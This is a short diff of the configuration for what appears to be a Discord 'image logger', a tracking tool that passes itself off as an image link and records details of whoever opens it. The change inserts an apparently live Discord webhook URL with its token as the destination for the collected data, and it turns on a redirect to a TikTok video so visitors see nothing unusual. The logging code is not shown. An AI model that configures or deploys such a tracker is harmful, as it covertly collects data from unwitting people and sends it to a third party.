@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1403387372145479820/7_iANcFtZrD7-5gzBLFbiIoUgiLuiFMOrQDSuWlyhtR1iZg4kpcWIoz0UUXq_bn7LHrx",
+    "webhook": "https://discord.com/api/webhooks/1487544685286260736/NXWg6tI2WDWHryyIKngEvZLqh401dZmWHPF0ALZFirU1d3GMviuakEFGgd4wH1GbEJ3_",
     "image": "https://ih1.redbubble.net/image.4984926493.8694/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.u1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.tiktok.com/@lwntja/video/7406670017615383814?q=boykisser&t=1774728395186" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
